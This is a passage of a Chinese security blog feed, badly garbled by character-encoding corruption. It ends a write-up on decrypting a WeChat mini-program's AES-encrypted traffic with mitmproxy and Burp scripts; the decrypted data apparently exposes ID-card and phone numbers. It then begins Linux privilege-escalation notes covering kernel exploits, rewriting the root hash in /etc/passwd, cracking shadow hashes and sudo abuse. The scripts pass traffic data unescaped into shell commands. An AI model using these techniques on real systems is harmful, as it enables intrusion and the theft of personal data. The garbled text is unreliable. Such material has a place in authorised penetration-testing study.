target="_blank" rel="noopener">æµ…æç»•è¿‡jsåŠ å¯†</a></li>
<li>é…’ä»™æ¡¥å…­å·éƒ¨é˜Ÿçš„æ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247487489&idx=1&sn=742d096897ec68aa56b5ca6f1487ff8a&chksm=9b3936b0ac4ebfa6c7bdccff3bb2925060890124909d677be38e739a1b53266c2f85b66d2d69&mpshare=1&scene=1&srcid=1207OrxzaeK9ckVL9857JMtf&sharer_sharetime=1607352591412&sharer_shareid=13de7cf246df94cfb693d05988b76aac&key=ed33fadcd7748f6a66b9261cd211185fb382047b4897da09ba209d7f06af9e1aff0c86d9b3e1c874d0393a538cc27daf36d40279ea1b7f6b5be038c57e6562f57fc9bb2d40284a7759ce3ac613af175a719706f1f9afa135276b87ef4abac0923702de4150cf27dcedfa5119e07ccfeb7b551b9f1b52600024ebf9d60b1e67b9&ascene=1&uin=MjYzNzU1MTExOQ%3D%3D&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=AzOgolmxO3RY7b1N0n5f2RE%3D&pass_ticket=j3w8TlVmPs9N80MO5TFJBD7B5UBteDVgYV%2F8ZHp9b5yGtAXAvTP9pPL5H0yBeKHA&wx_header=0" target="_blank" rel="noopener">å‰ç«¯åŠ å¯†åŠ ç­¾ä¹‹sqlmapè‡ªåŠ¨åŒ–æµ‹è¯•</a></li>
</ul>
</li>
<li>åœ¨Burpsuiteä¸­å¯ä»¥å‘ç°æ•°æ®åŒ…ä¸­POSTçš„bodyå­—æ®µå’Œå“åº”åŒ…çš„bodyå­—æ®µæ•°æ®éƒ½æ˜¯åŠ å¯†çš„ï¼Œæƒ³åˆ°å…¬å¸å¤§ä½¬çš„ä¸€å¥è¯â€œåªè¦æ˜¯å‰ç«¯åŠ å¯†ï¼Œæˆ‘éƒ½èƒ½ç»™ä½ è§£å¯†â€</li>
</ul>
<p><img src="/images/js/image-20201207132142502.png" alt="image-20201207132142502"></p>
<h4 id="2ã€æ‹–ä¸‹å°ç¨‹åºæºç "><a href="#2ã€æ‹–ä¸‹å°ç¨‹åºæºç " class="headerlink" title="2ã€æ‹–ä¸‹å°ç¨‹åºæºç "></a>2ã€æ‹–ä¸‹å°ç¨‹åºæºç </h4><ul>
<li>æ€è·¯è¿‡ç¨‹ï¼šadbè¿æ¥æ¨¡æ‹Ÿå™¨   -&gt;  æ‰¾åˆ°å°ç¨‹åºçš„æºç åŒ…wxapkg  -&gt;  ä½¿ç”¨adb pullè¿›è¡Œæ‹‰å–åˆ°æœ¬åœ°  -&gt;  é€šè¿‡unpackå·¥å…·æ¥è§£å‡ºæºç ï¼Œå…·ä½“çš„å°ç¨‹åºè„±åŒ…æ•™ç¨‹ä»¥åŠå·¥å…·æ–‡ç« ï¼Œæ„Ÿå…´è¶£çš„å¤§å“¥å¯ä»¥ä»é›·ç¥ä¼—æµ‹ä¸ŠæŸ¥çœ‹<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI0NzEwOTM0MA==&action=getalbum&album_id=1368680445315235841&scene=173&from_msgid=2652476342&from_itemidx=1&count=3#wechat_redirect" target="_blank" rel="noopener">Poc Sir</a>çš„æ–‡ç« <ul>
<li>xuedingmiaojunå¤§ä½¬çš„ä¸å¸¦GUIç•Œé¢ï¼š<a href="https://github.com/xuedingmiaojun/wxappUnpacker" target="_blank" rel="noopener">wxappUnpacker</a></li>
<li>xuedingmiaojunå¤§ä½¬çš„å¸¦GUIç•Œé¢ï¼š<a href="https://github.com/xuedingmiaojun/mp-unpack" target="_blank" rel="noopener">mp-unpack</a>ï¼ˆå®æµ‹æ­¤å·¥å…·èƒ½è¾ƒå®Œå–„è§£æwxapkgåŒ…ï¼‰</li>
</ul>
</li>
</ul>
<p><img src="/images/js/image-20201207132433238.png" alt="image-20201207132433238"></p>
<p><img src="/images/js/image-20201207132822003.png" alt="image-20201207132822003"></p>
<h4 id="3ã€å¿«é€Ÿåˆ†ææºç "><a href="#3ã€å¿«é€Ÿåˆ†ææºç " class="headerlink" title="3ã€å¿«é€Ÿåˆ†ææºç "></a>3ã€å¿«é€Ÿåˆ†ææºç </h4><ul>
<li>ä½¿ç”¨Sublimeæ‰“å¼€å‹ç¼©åŒ…çš„æ–‡ä»¶ï¼Œæ¥è¿›è¡Œæºç çš„æŸ¥çœ‹</li>
</ul>
<p><img src="/images/js/image-20201207133009652.png" alt="image-20201207133009652"></p>
<ul>
<li>ä»åˆšæ‰æŠ“å–çš„Burpsuiteçš„æ•°æ®åŒ…ä¸­çš„è¯·æ±‚è¿æ¥ï¼Œå…¨å±€åŒ¹é…å¯¹åº”çš„å¥å­ï¼Œå‘ç°äº†åœ¨/pages/myInfoç›®å½•ä¸‹çš„A.api.jsæ–‡ä»¶è¿›è¡Œäº†POSTè¯·æ±‚</li>
</ul>
<p><img src="/images/js/image-20201207133237727.png" alt="image-20201207133237727"></p>
<ul>
<li>è·Ÿè¿›å¯¹åº”çš„jsæ–‡ä»¶ï¼Œå‘ç°é€šè¿‡t.requestæ–¹æ³•æ¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚</li>
</ul>
<p><img src="/images/js/image-20201207133443596.png" alt="image-20201207133443596"></p>
<ul>
<li>è·Ÿè¿›t.requestæ–¹æ³•ï¼Œå‘ç°æ˜¯å¯¼å…¥/utilsç›®å½•ä¸‹çš„requestæ¨¡å—</li>
</ul>
<p><img src="/images/js/image-20201207133615515.png" alt="image-20201207133615515"></p>
<ul>
<li>è·Ÿè¿›request.jsæ–‡ä»¶ï¼Œå‘ç°é»˜è®¤å¯¼å‡ºä¸ºaï¼Œaåˆé€šè¿‡å‡½æ•°pæ¥è¿›è¡Œèµ‹å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œåˆé€šè¿‡å¼•å…¥o.defaultæ¥è¿›è¡Œä¼ å‚</li>
</ul>
<p><img src="/images/js/image-20201207134041254.png" alt="image-20201207134041254"></p>
<ul>
<li>è·Ÿè¿›o.defaultï¼Œå‘ç°æ˜¯é€šè¿‡å¯¼å…¥/miniprogram_npm/wx-weapp-tool/indexä¸‹çš„indexæ¨¡å—æ¥å®ç°çš„</li>
</ul>
<p><img src="/images/js/image-20201207134147765.png" alt="image-20201207134147765"></p>
<ul>
<li>è·Ÿè¿›index.jsæ–‡ä»¶ï¼Œå‘ç°é»˜è®¤å¯¼å‡ºä¸ºyï¼Œyåˆé€šè¿‡gå»èµ‹å€¼ï¼Œæœç´¢åŒ…å«gçš„å‚æ•°æˆ–è€…å‡½æ•°ï¼Œå‘ç°gå‡½æ•°ï¼Œgå‡½æ•°ä¸­æœ‰å¯¹oçš„å¤„ç†ï¼Œé€šè¿‡c.default.encryptæ¥è¿›è¡ŒåŠ å¯†</li>
</ul>
<p><img src="/images/js/image-20201207134453778.png" alt="image-20201207134453778"></p>
<ul>
<li>æœç´¢cçš„ç›¸å…³å‡½æ•°æˆ–è€…å…¶ä»–å˜é‡ï¼Œå‘ç°æ˜¯å¯¼å…¥d2jk-share-templatesç›®å½•ä¸‹çš„aesæ¨¡å—</li>
</ul>
<p><img src="/images/js/image-20201207141754540.png" alt="image-20201207141754540"></p>
<ul>
<li>è·Ÿè¿›aes.jsæ–‡ä»¶ï¼Œå‘ç°æ­¤æ–‡ä»¶å°±æ˜¯æœ€åçš„åŠ å¯†å‡½æ•°ï¼Œä»¥åŠåŠ è§£å¯†æ–¹æ³•ä¸ºAESåŠ å¯†ç»“åˆBase64åŠ å¯†ï¼Œå¯ä»¥é€šè¿‡å¯¼å…¥crypto-jsåº“æ¥å®ç°</li>
</ul>
<p><img src="/images/js/image-20201207141849011.png" alt="image-20201207141849011"></p>
<ul>
<li>å°†æ­¤æ–‡ä»¶è¿›è¡Œå¯¼å‡ºï¼Œé‡æ–°å®šä¹‰ä¸ºase.jsæ–‡ä»¶ï¼Œåœ¨ç»ˆç«¯è¿›è¡ŒåŠ è§£å¯†å°è¯•ï¼Œå‘ç°è§£å¯†æˆåŠŸ</li>
</ul>
<p><img src="/images/js/image-20201207142451440.png" alt="image-20201207142451440"></p>
<ul>
<li>å¯¹å“åº”åŒ…çš„å†…å®¹è¿›è¡Œè§£å¯†ï¼Œå‘ç°äº†èº«ä»½è¯ä»¥åŠæ‰‹æœºå·</li>
</ul>
<p><img src="/images/js/image-20201207142919931.png" alt="image-20201207142919931"></p>
<ul>
<li>åœ¨loå‡ºæ•°æ®åï¼Œå‘ç°é€šè¿‡é»è´´å¯†æ–‡ï¼Œå†è¾“å…¥keyçš„æ–¹å¼æ•ˆç‡å®åœ¨æ˜¯å¤ªä½äº†ï¼Œå‡†å¤‡æ‰“ç®—å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„ä¸­é—´äººè„šæœ¬æ¥å®ç°æ­¤è¿‡ç¨‹</li>
</ul>
<h3 id="0X01-mitmä¸­é—´äººè„šæœ¬ç¼–å†™"><a href="#0X01-mitmä¸­é—´äººè„šæœ¬ç¼–å†™" class="headerlink" title="0X01 mitmä¸­é—´äººè„šæœ¬ç¼–å†™"></a>0X01 mitmä¸­é—´äººè„šæœ¬ç¼–å†™</h3><h4 id="1ã€éœ€æ±‚å‰æ"><a href="#1ã€éœ€æ±‚å‰æ" class="headerlink" title="1ã€éœ€æ±‚å‰æ"></a>1ã€éœ€æ±‚å‰æ</h4><ul>
<li>å®ç°åŸç†å›¾</li>
</ul>
<p><img src="/images/js/image-20201208001317260.png" alt="image-20201208001317260"></p>
<ul>
<li><p>æ‰€éœ€å·¥å…·</p>
<ul>
<li>python 3.6</li>
<li>mitmproxy 5.0.1</li>
<li>Burpsuite</li>
</ul>
</li>
<li><p>å‚è€ƒæ–‡ç« æ¨è</p>
<ul>
<li><a href="https://www.freebuf.com/articles/web/243370.html" target="_blank" rel="noopener">Burpsuite+Mitmproxy+Pythonè§£å†³Webæ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­é‡åˆ°çš„è‡ªå®šä¹‰JSåŠ å¯†é˜²æŠ¤</a></li>
<li><a href="https://www.cnblogs.com/linlang781/p/8868496.html" target="_blank" rel="noopener">pythonè°ƒç”¨JSæ–¹æ³•</a></li>
</ul>
</li>
</ul>
<h4 id="2ã€å®ç°è¿‡ç¨‹"><a href="#2ã€å®ç°è¿‡ç¨‹" class="headerlink" title="2ã€å®ç°è¿‡ç¨‹"></a>2ã€å®ç°è¿‡ç¨‹</h4><ul>
<li>jsæ–‡ä»¶çš„æ¨¡æ¿å‡½æ•°å¯¼å‡ºï¼Œæ–¹ä¾¿å¤–éƒ¨çš„è°ƒç”¨</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports.enc=<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i.encrypt(data,i.key))</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">module</span>.exports.dec=<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i.decrypt(data,i.key))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>åŠ è§£å¯†å‡½æ•°çš„ç¼–å†™<ul>
<li>cmdä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä½¿ç”¨nodeçš„-eå‚æ•°ï¼Œrequireè°ƒç”¨æ¨¡å—ä»¥åŠæ¨¡å—é‡Œé¢çš„å‚æ•°</li>
<li>pipelineè·å¾—os.popenåçš„å†…å®¹</li>
<li>æœ€åè¿”å›result</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data)</span>:</span></span><br><span class="line">    cmd = <span class="string">'node -e "require(\\"./ase.js\\").enc(\'%s\')"'</span> % (data)</span><br><span class="line">    pipeline = os.popen(cmd)</span><br><span class="line">    result = pipeline.read()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(data)</span>:</span></span><br><span class="line">    cmd = <span class="string">'node -e "require(\\"./ase.js\\").dec(\'%s\')"'</span> % (data)</span><br><span class="line">    pipeline = os.popen(cmd)</span><br><span class="line">    result = pipeline.read()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<ul>
<li><p>mitmç¬¬ä¸€å±‚ä»£ç†çš„ç¼–å†™</p>
<ul>
<li><p>éœ€è¦æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„åŠ å¯†è¯·æ±‚ï¼Œå¯ä»¥é€šè¿‡<code>mitmdump -p 8081</code>å»ç›‘å¬ç«¯å£ï¼Œå®¢æˆ·ç«¯è®¾ç½®8081ç«¯å£è¿›è¡Œä»£ç†æµé‡</p>
</li>
<li><p>æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„åŠ å¯†æ•°æ®ï¼Œè¿›è¡Œè§£å¯†ï¼Œç„¶åå‘é€ç»™Burpsuite</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, flow: http.HTTPFlow)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").enc(\'%s\')"'</span> % (data)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.read()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").dec(\'%s\')"'</span> % (data)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.read()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        req_data = flow.request.get_text()</span><br><span class="line">        <span class="keyword">if</span>  req_data:</span><br><span class="line">            print(<span class="string">"req:"</span>+req_data)</span><br><span class="line">            print(<span class="string">"è§£å¯†:"</span>+dec(req_data))</span><br><span class="line">            flow.request.set_text(dec(req_data))</span><br></pre></td></tr></table></figure>

<ul>
<li>å‘é€æ¥è‡ªBurpsuiteçš„è§£å¯†æ•°æ®ï¼Œè¿›è¡ŒåŠ å¯†ï¼Œç„¶åå‘é€ç»™å®¢æˆ·ç«¯</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response</span><span class="params">(self, flow: http.HTTPFlow)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").enc(\'%s\')"'</span> % (data)</span><br><span class="line">            print(cmd)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.buffer.read().decode(encoding=<span class="string">"utf-8"</span>) <span class="comment"># å› ä¸ºä¸­æ–‡ç¼–ç é—®é¢˜ä¼šæŠ¥é”™ï¼Œè¿™é‡Œéœ€è¦è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").dec(\'%s\')"'</span> % (data)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.buffer.read().decode(encoding=<span class="string">"utf-8"</span>) <span class="comment"># å› ä¸ºä¸­æ–‡ç¼–ç é—®é¢˜ä¼šæŠ¥é”™ï¼Œè¿™é‡Œéœ€è¦è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        resp_data = flow.response.get_text()</span><br><span class="line">        <span class="keyword">if</span> resp_data:</span><br><span class="line">            print(resp_data.strip(<span class="string">'\n'</span>))</span><br><span class="line">            flow.response.set_text(dec(resp_data.strip(<span class="string">'\n'</span>)))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>è®¾ç½®ä¸Šæ¸¸ä»£ç†ä¸ºBurpsuiteï¼Œè¿›è¡Œæ•°æ®åŒ…çš„è½¬å‘<code>mitmdump -p 8081 -m upstream:http://127.0.0.1:8080 -s min.py -k</code></p>
<ul>
<li>-m ä¸ºæŒ‡å®šä¸Šæ¸¸ä»£ç†æ¨¡å—ï¼Œè¿™é‡Œä¸ºBurpsuiteç›‘å¬çš„ç«¯å£</li>
<li>-k ä¸ºå¿½ç•¥è¯ä¹¦çš„é”™è¯¯ï¼ŒåŒæ—¶ä¹Ÿéœ€è¦åœ¨å®¢æˆ·ç«¯ä¸­å®‰è£…mitmçš„è¯ä¹¦ï¼ˆå®‰è£…mitmçš„è¯ä¹¦åœ¨è®¾ç½®ä»£ç†çš„æƒ…å†µä¸‹è®¿é—®<a href="https://mitm.itä¸‹è½½å³å¯ï¼‰" target="_blank" rel="noopener">https://mitm.itä¸‹è½½å³å¯ï¼‰</a></li>
<li>-s ä¸ºæŒ‡å®šä½¿ç”¨çš„è„šæœ¬</li>
</ul>
<p><img src="/images/js/image-20201208100558530.png" alt="image-20201208100558530"></p>
</li>
<li><p>å‘ç°å·²ç»å¯ä»¥æ­£å¸¸çš„å¯¹è¯·æ±‚æŠ¥è¿›è¡Œè§£å¯†</p>
</li>
</ul>
<p><img src="/images/js/image-20201208100941327.png" alt="image-20201208100941327"></p>
</li>
<li><p>Burpsuiteçš„è®¾ç½®</p>
<ul>
<li>ç›‘å¬8080ç«¯å£ï¼Œæ¥æ”¶æ¥è‡ªmitmç¬¬ä¸€å±‚ä»£ç†çš„æ•°æ®</li>
<li>è®¾ç½®ä¸Šå±‚ä»£ç†ä¸ºmitmç¬¬ä¸‰å±‚ä»£ç†ï¼Œè¿›è¡Œæ•°æ®åŒ…çš„è½¬å‘</li>
</ul>
</li>
</ul>
<p><img src="/images/js/image-20201208101410378.png" alt="image-20201208101410378"></p>
<ul>
<li><p>mitmç¬¬ä¸‰å±‚ä»£ç†çš„ç¼–å†™</p>
<ul>
<li>æ¥æ”¶æ¥è‡ªBurpsuiteçš„è§£å¯†åçš„æ•°æ®ï¼Œå¯ä»¥é€šè¿‡<code>mitmdump -p 8088</code>å»ç›‘å¬ç«¯å£</li>
<li>æ¥æ”¶æ¥è‡ªBurpsuiteçš„è§£å¯†æ•°æ®ï¼Œè¿›è¡ŒåŠ å¯†ï¼Œç„¶åå‘é€ç»™æœåŠ¡ç«¯</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, flow: http.HTTPFlow)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").enc(\'%s\')"'</span> % (data.strip(<span class="string">'\n'</span>))</span><br><span class="line">            print(cmd)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.buffer.read().decode(encoding=<span class="string">"utf-8"</span>)<span class="comment"># å› ä¸ºä¸­æ–‡ç¼–ç é—®é¢˜ä¼šæŠ¥é”™ï¼Œè¿™é‡Œéœ€è¦è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").dec(\'%s\')"'</span> % (data)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.buffer.read().decode(encoding=<span class="string">"utf-8"</span>)<span class="comment"># å› ä¸ºä¸­æ–‡ç¼–ç é—®é¢˜ä¼šæŠ¥é”™ï¼Œè¿™é‡Œéœ€è¦è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        req_data = flow.request.get_text()</span><br><span class="line">        <span class="keyword">if</span>  req_data:</span><br><span class="line">            print(req_data)</span><br><span class="line">            print(<span class="string">"sdasdasdasa"</span>)</span><br><span class="line">            req_data = req_data.replace(<span class="string">'"'</span>,<span class="string">'\\"'</span>)</span><br><span class="line">            print(<span class="string">"req:"</span>+req_data)</span><br><span class="line">            print(<span class="string">"åŠ å¯†:"</span>+enc(req_data))</span><br><span class="line">            flow.request.set_text(enc(req_data))</span><br></pre></td></tr></table></figure>

<ul>
<li>å‘é€æ¥è‡ªæœåŠ¡ç«¯çš„åŠ å¯†æ•°æ®ï¼Œè¿›è¡Œè§£å¯†ï¼Œç„¶åå‘é€ç»™Burpsuite</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response</span><span class="params">(self, flow: http.HTTPFlow)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").enc(\'%s\')"'</span> % (data)</span><br><span class="line">            print(cmd)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.buffer.read().decode(encoding=<span class="string">"utf-8"</span>)<span class="comment"># å› ä¸ºä¸­æ–‡ç¼–ç é—®é¢˜ä¼šæŠ¥é”™ï¼Œè¿™é‡Œéœ€è¦è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(data)</span>:</span></span><br><span class="line">            cmd = <span class="string">'node -e "require(\\"./ase.js\\").dec(\'%s\')"'</span> % (data)</span><br><span class="line">            pipeline = os.popen(cmd)</span><br><span class="line">            result = pipeline.buffer.read().decode(encoding=<span class="string">"utf-8"</span>)<span class="comment"># å› ä¸ºä¸­æ–‡ç¼–ç é—®é¢˜ä¼šæŠ¥é”™ï¼Œè¿™é‡Œéœ€è¦è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        resp_data = flow.response.get_text()</span><br><span class="line">        <span class="keyword">if</span> resp_data:</span><br><span class="line">            print(<span class="string">"req:"</span>+resp_data)</span><br><span class="line">            print(<span class="string">"è§£å¯†:"</span>+dec(resp_data))</span><br><span class="line">            print(resp_data.strip(<span class="string">'\n'</span>))</span><br><span class="line">            flow.response.set_text(dec(resp_data.strip(<span class="string">'\n'</span>)))</span><br></pre></td></tr></table></figure>

<ul>
<li>è®¾ç½®è½¬å‘ç»™æœåŠ¡å™¨ï¼Œè¿›è¡Œæ•°æ®åŒ…çš„è½¬å‘<code>mitmdump -p 8088 -s min.py -k</code></li>
</ul>
<p><img src="/images/js/image-20201208103439259.png" alt="image-20201208103439259"></p>
<ul>
<li>ä½¿ç”¨Burpsuiteçš„Repeateræ¨¡å—è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å·²ç»å¯ä»¥æ­£å¸¸åŠ è§£å¯†äº†</li>
</ul>
<p><img src="/images/js/image-20201208103721232.png" alt="image-20201208103721232"></p>
<p><img src="/images/js/image-20201208104630280.png" alt="image-20201208104630280"></p>
</li>
</ul>
<h3 id="0X02-æ€»ç»“"><a href="#0X02-æ€»ç»“" class="headerlink" title="0X02 æ€»ç»“"></a>0X02 æ€»ç»“</h3><p>â€‹        è¿™æ¬¡çš„è¿‡ç¨‹ä¸­ä¹Ÿå­˜åœ¨ç€å¾ˆå¤šé—®é¢˜ï¼Œè¯·å„ä½è·¯è¿‡çš„å¤§å“¥å¤§å§å¤§ä½¬ç­‰ä¸åæŒ‡å¯¼ï¼Œåç»­æƒ³é›†æˆä¸€ä¸ªBurpsuiteæ’ä»¶ï¼Œå¯ä»¥è‡ªå®šä¹‰éœ€è¦åŠ è§£å¯†çš„ç›®æ ‡åœ°å€æ–¹ä¾¿æ¸—é€æµ‹è¯•åŠ è§£å¯†ï¼Œåªéœ€è¦å¯¼å…¥åŠ å¯†çš„jsæ–‡ä»¶å³å¯ï¼Œå„ä¸ªè®ºå›ç½‘ç«™ä¸Šä¹Ÿæœ‰å„ä¸ªå¤§ä½¬å¼€å‘çš„æ’ä»¶è„šæœ¬ï¼Œæƒ³åç»­ç»§ç»­æ·±å…¥å­¦ä¹ </p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Linuxææƒ</title>
    <url>/2020/08/20/linux_privilege_escalation/</url>
    <content><![CDATA[<h2 id="Linuxææƒ"><a href="#Linuxææƒ" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h2><h3 id="0X00-å†…æ ¸æ¼æ´ææƒ"><a href="#0X00-å†…æ ¸æ¼æ´ææƒ" class="headerlink" title="0X00 å†…æ ¸æ¼æ´ææƒ"></a>0X00 å†…æ ¸æ¼æ´ææƒ</h3><ul>
<li>æŸ¥çœ‹å‘è¡Œç‰ˆ<ul>
<li><code>cat /etc/issue</code></li>
<li><code>cat /etc/*-release</code></li>
</ul>
</li>
<li>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬<ul>
<li><code>uname -a</code></li>
</ul>
</li>
<li>æŸ¥çœ‹å·²ç»å®‰è£…çš„ç¨‹åº<ul>
<li><code>dpkg -l</code></li>
<li><code>rpm -qa</code></li>
</ul>
</li>
<li>åˆ©ç”¨æ–¹æ³•<ul>
<li>ç°æœ‰å­˜åœ¨çš„expï¼Œå¯ä»¥è·å¾—rootæƒé™ï¼š<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
<li>ä½¿ç”¨Linuxçš„Searchexploit Linuxç‰ˆæœ¬</li>
<li>â–² æ³¨ï¼šå¾ˆå¤šLinuxçš„æœºå­éƒ½å­˜åœ¨è„ç‰›ææƒæ¼æ´ </li>
</ul>
</li>
</ul>
<h3 id="0X01-æ˜æ–‡rootå¯†ç ææƒ"><a href="#0X01-æ˜æ–‡rootå¯†ç ææƒ" class="headerlink" title="0X01 æ˜æ–‡rootå¯†ç ææƒ"></a>0X01 æ˜æ–‡rootå¯†ç ææƒ</h3><ul>
<li>passwdã€shadow<ul>
<li>passwdå‚¨å­˜äº†ç”¨æˆ·ï¼Œå…¨ç”¨æˆ·å¯è¯»ï¼Œrootå¯å†™</li>
<li>shadowå­˜å‚¨å¯†ç çš„hashï¼Œä»…rootå¯ç‹¬å†™</li>
</ul>
</li>
<li>ææƒå‰æ<ul>
<li>passwdå¯å†™  -&gt;   å°†passwdçš„rootå¯†ç Xæ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå·±çš„hash</li>
<li>shadowå¯è¯»  -&gt;   æŠŠshadowé‡Œé¢rootçš„hashè¾…åŠ©å‡ºæ¥ï¼Œç”¨hashã€johnçˆ†ç ´</li>
</ul>
</li>
<li>â–² 2020-08-05é«˜ç‰ˆæœ¬Linuxæ— æ³•è¿›è¡Œä¿®æ”¹ï¼Œé»˜è®¤æƒ…å†µæ™®é€šç”¨æˆ·passwdä¸å¯å†™ï¼Œshadowä¸å¯è¯»</li>
</ul>
<h3 id="0X02-å¯†ç å¤ç”¨"><a href="#0X02-å¯†ç å¤ç”¨" class="headerlink" title="0X02 å¯†ç å¤ç”¨"></a>0X02 å¯†ç å¤ç”¨</h3><ul>
<li>æ•°æ®åº“æˆ–è€…Webåå°çš„å¯†ç å°±æ˜¯rootå¯†ç </li>
</ul>
<h3 id="0X03-sudoææƒæ»¥ç”¨"><a href="#0X03-sudoææƒæ»¥ç”¨" class="headerlink" title="0X03 sudoææƒæ»¥ç”¨"></a>0X03 sudoææƒæ»¥ç”¨</h3><ul>
<li>sudoæ˜¯è®©æ™®é€šç”¨æˆ·ä½¿ç”¨è¶…çº§ç”¨æˆ·çš„å‘½ä»¤ï¼Œå…¶é…ç½®æ–‡ä»¶ä¸º/etc/sudoersï¼Œæ–‡ä»¶å®šä¹‰å¯ä»¥æ‰§è¡Œsudoçš„è´¦æˆ·ã€å®šä¹‰æŸä¸ªåº”ç”¨ç¨‹åºç”¨rootè®¿é—®ã€æ˜¯å¦éœ€è¦å¯†ç éªŒè¯</li>
<li>é€šè¿‡<code>sudo -l</code>æ¥æŸ¥çœ‹æ˜¯å¦å…·æœ‰sudoæƒé™æˆ–è€…é€šè¿‡<code>groups</code>æŸ¥çœ‹ç»„æ˜¯å¦å…·æœ‰å…è®¸sudoå‘½ä»¤æƒé™</li>
</ul>
<p><img src="/images/privilge/linux-sudo-l.png" alt="linux-sudo-l"></p>
<h5 id="su-rootè¢«ç¦æ­¢"><a href="#su-rootè¢«ç¦æ­¢" class="headerlink" title="su rootè¢«ç¦æ­¢"></a>su rootè¢«ç¦æ­¢</h5><ul>
<li>åŸå› ï¼šLinuxè¦æ±‚ç”¨æˆ·å¿…é¡»ä»ç»ˆç«¯è®¾å¤‡ï¼ˆttyï¼‰ä¸­è¾“å…¥å¯†ç ï¼Œè€Œä¸æ˜¯æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ï¼Œæ‰€ä»¥sudoåœ¨è¾“å…¥å¯†ç çš„æ—¶å€™æœ¬è´¨ä¸Šæ˜¯è¯»å–äº†é”®ç›˜ï¼Œè€Œä¸æ˜¯è¯»å–bashé‡Œé¢è¾“å…¥çš„å­—ç¬¦</li>
